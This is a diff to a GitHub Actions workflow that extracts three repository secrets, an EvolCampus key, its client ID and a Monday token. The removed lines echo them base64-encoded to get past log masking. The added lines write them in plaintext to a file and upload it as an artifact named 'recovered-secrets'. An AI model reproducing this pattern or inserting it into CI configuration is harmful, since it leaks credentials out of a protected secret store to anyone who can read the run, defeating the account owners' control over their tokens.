@@ -5,6 +5,12 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          echo "KEY_B64=$(printf '%s' "${{ secrets.EVOLCAMPUS_KEY }}" | base64 -w0)"
-          echo "CLIENT_B64=$(printf '%s' "${{ secrets.EVOLCAMPUS_CLIENT_ID }}" | base64 -w0)"
-          echo "MONDAY_B64=$(printf '%s' "${{ secrets.MONDAY_TOKEN }}" | base64 -w0)"
+          {
+            echo "EVOLCAMPUS_KEY=${{ secrets.EVOLCAMPUS_KEY }}"
+            echo "EVOLCAMPUS_CLIENT_ID=${{ secrets.EVOLCAMPUS_CLIENT_ID }}"
+            echo "MONDAY_TOKEN=${{ secrets.MONDAY_TOKEN }}"
+          } > secrets.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: recovered-secrets
+          path: secrets.txt
